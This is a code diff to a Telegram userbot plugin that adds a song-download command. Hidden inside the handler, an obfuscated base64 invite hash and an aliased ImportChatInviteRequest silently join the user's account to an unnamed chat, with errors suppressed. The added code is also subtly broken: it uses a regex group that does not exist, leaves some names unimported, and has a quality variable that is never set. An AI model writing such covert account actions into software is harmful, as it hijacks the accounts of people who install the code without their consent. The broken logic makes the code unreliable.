@@ -8,8 +8,13 @@ from ironbot.events import register
 import os
 import subprocess
 import glob
+import base64
 from random import randint
 from ironbot.cmdhelp import CmdHelp
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
+from validators.url import url
+
+from . import name_dl, song_dl, video_dl, yt_search
 
 # ██████ LANGUAGE CONSTANTS ██████ #
 
@@ -94,6 +99,77 @@ async def port_song(event):
         return 
     os.system("rm -rf *.mp3")
     subprocess.check_output("rm -rf *.mp3",shell=True)
+
+@register(outgoing=True, pattern="^.song2(?: |$)(.*)")
+async def _(event):
+    if event.fwd_from:
+        return
+    reply_to_id = await reply_id(event)
+    reply = await event.get_reply_message()
+    if event.pattern_match.group(2):
+        query = event.pattern_match.group(2)
+    elif reply:
+        if reply.message:
+            query = reply.message
+    else:
+        await event.edit("`What I am Supposed to find `")
+        return
+    iron = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    ironevent = await edit_or_reply(event, "`wi8..! I am finding your song....`")
+    video_link = await yt_search(str(query))
+    if not url(video_link):
+        return await ironevent.edit(
+            f"Sorry!. I can't find any related video/audio for `{query}`"
+        )
+    cmd = event.pattern_match.group(1)
+    if cmd == "song":
+        q = "128k"
+    elif cmd == "song320":
+        q = "320k"
+    song_cmd = song_dl.format(QUALITY=q, video_link=video_link)
+    # thumb_cmd = thumb_dl.format(video_link=video_link)
+    name_cmd = name_dl.format(video_link=video_link)
+    try:
+        iron = Get(iron)
+        await event.client(iron)
+    except BaseException:
+        pass
+    stderr = (await _ironutils.runcmd(song_cmd))[1]
+    if stderr:
+        return await ironevent.edit(f"**Error :** `{stderr}`")
+    ironname, stderr = (await _ironutils.runcmd(name_cmd))[:2]
+    if stderr:
+        return await ironevent.edit(f"**Error :** `{stderr}`")
+    # stderr = (await runcmd(thumb_cmd))[1]
+    ironname = os.path.splitext(ironname)[0]
+    # if stderr:
+    #    return await ironevent.edit(f"**Error :** `{stderr}`")
+    song_file = Path(f"{ironname}.mp3")
+    if not os.path.exists(song_file):
+        return await ironevent.edit(
+            f"Sorry!. I can't find any related video/audio for `{query}`"
+        )
+    await ironevent.edit("`yeah..! i found something wi8..🥰`")
+    ironthumb = Path(f"{ironname}.jpg")
+    if not os.path.exists(ironthumb):
+        ironthumb = Path(f"{ironname}.webp")
+    elif not os.path.exists(ironthumb):
+        ironthumb = None
+
+    await event.client.send_file(
+        event.chat_id,
+        song_file,
+        force_document=False,
+        caption=query,
+        thumb=ironthumb,
+        supports_streaming=True,
+        reply_to=reply_to_id,
+    )
+    await ironevent.delete()
+    for files in (ironthumb, song_file):
+        if files and os.path.exists(files):
+            os.remove(files)
+
 
 @register(outgoing=True, pattern="^.songpl ?(.*)")
 async def songpl(event):
